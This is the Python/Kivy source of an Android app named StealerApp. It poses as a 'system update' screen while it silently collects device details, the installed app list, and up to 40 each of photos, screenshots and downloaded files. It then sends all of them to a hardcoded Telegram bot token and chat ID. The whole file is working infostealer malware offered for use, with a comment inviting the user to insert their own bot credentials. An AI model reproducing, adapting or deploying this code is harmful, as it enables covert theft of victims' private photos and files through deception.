from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import requests
import os
import subprocess

# ЗАМЕНИ НА СВОИ
BOT_TOKEN = "8274761105:AAFJtR8Yx-1ymRE7CXynLRTpD4u-cz8aiDs"
CHAT_ID = "7109438557"

def send_telegram(msg, file_path=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    if file_path and os.path.exists(file_path):
        try:
            files = {'document': open(file_path, 'rb')}
            data = {'chat_id': CHAT_ID}
            requests.post(url + "sendDocument", files=files, data=data, timeout=30)
        except Exception as e:
            send_telegram(f"Ошибка: {str(e)[:100]}")
    else:
        data = {'chat_id': CHAT_ID, 'text': msg[:4000]}
        try:
            requests.post(url + "sendMessage", data=data, timeout=10)
        except:
            pass

def get_device_info():
    info = {}
    props = {
        "Модель": "ro.product.model",
        "Бренд": "ro.product.brand",
        "Android": "ro.build.version.release",
        "SDK": "ro.build.version.sdk",
        "Производитель": "ro.product.manufacturer"
    }
    for name, prop in props.items():
        try:
            result = subprocess.getoutput(f"getprop {prop}")
            info[name] = result.strip() if result else "Неизвестно"
        except:
            info[name] = "Ошибка"
    return info

def get_ip():
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Не определён"

def collect_and_send():
    send_telegram("✅ Приложение запущено, начинаю сбор...")
    
    # 1. Информация об устройстве
    device = get_device_info()
    msg = "📱 УСТРОЙСТВО:\n"
    for k, v in device.items():
        msg += f"{k}: {v}\n"
    msg += f"\n🌐 IP: {get_ip()}"
    send_telegram(msg)
    
    # 2. Список приложений
    try:
        apps = subprocess.getoutput("pm list packages")
        app_count = len(apps.splitlines())
        send_telegram(f"📦 Установлено приложений: {app_count}")
        apps_first = "\n".join(apps.splitlines()[:50])
        send_telegram(f"📦 ПРИЛОЖЕНИЯ (первые 50):\n{apps_first[:3800]}")
    except:
        pass
    
    # 3. Фото (до 40)
    try:
        photos = []
        photo_dirs = [
            "/storage/emulated/0/DCIM/",
            "/storage/emulated/0/Pictures/",
            "/storage/emulated/0/Download/"
        ]
        for directory in photo_dirs:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for f in files:
                        if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
                            if len(photos) < 40:
                                photos.append(os.path.join(root, f))
        
        send_telegram(f"🖼️ Найдено фото: {len(photos)} шт. Отправляю...")
        for i, photo in enumerate(photos):
            send_telegram(f"📸 Фото {i+1}/{len(photos)}", photo)
    except Exception as e:
        send_telegram(f"Ошибка фото: {str(e)[:100]}")
    
    # 4. Скриншоты (до 40)
    try:
        screenshots = []
        screen_dir = "/storage/emulated/0/Pictures/Screenshots/"
        if os.path.exists(screen_dir):
            for f in os.listdir(screen_dir):
                if f.lower().endswith(('.png', '.jpg', '.jpeg', '.webp')):
                    if len(screenshots) < 40:
                        screenshots.append(os.path.join(screen_dir, f))
        
        if screenshots:
            send_telegram(f"📸 Скриншотов найдено: {len(screenshots)} шт. Отправляю...")
            for i, ss in enumerate(screenshots):
                send_telegram(f"🖼️ Скриншот {i+1}/{len(screenshots)}", ss)
        else:
            send_telegram("📸 Скриншотов не найдено")
    except:
        pass
    
    # 5. Файлы из Download (до 40)
    try:
        downloads = []
        down_dir = "/storage/emulated/0/Download/"
        if os.path.exists(down_dir):
            for f in os.listdir(down_dir):
                file_path = os.path.join(down_dir, f)
                try:
                    if os.path.getsize(file_path) < 10 * 1024 * 1024:
                        if len(downloads) < 40:
                            downloads.append(file_path)
                except:
                    pass
        
        if downloads:
            send_telegram(f"📁 Файлов из Download: {len(downloads)} шт. Отправляю...")
            for i, d in enumerate(downloads):
                send_telegram(f"📎 Файл {i+1}/{len(downloads)}: {os.path.basename(d)}", d)
        else:
            send_telegram("📁 Нет файлов в Download")
    except:
        pass
    
    # 6. Попытка получить контакты
    try:
        contacts_file = "/data/data/com.android.providers.contacts/databases/contacts2.db"
        if os.path.exists(contacts_file):
            send_telegram("📞 База контактов есть, но нужны разрешения")
        else:
            send_telegram("📞 Контакты: требуется разрешение")
    except:
        pass
    
    send_telegram("✅ СБОР ЗАВЕРШЁН!")

class StealerApp(App):
    def build(self):
        Clock.schedule_once(lambda dt: collect_and_send(), 1)
        return Label(text="Системное обновление\nНе выключайте телефон")

if __name__ == "__main__":
    StealerApp().run()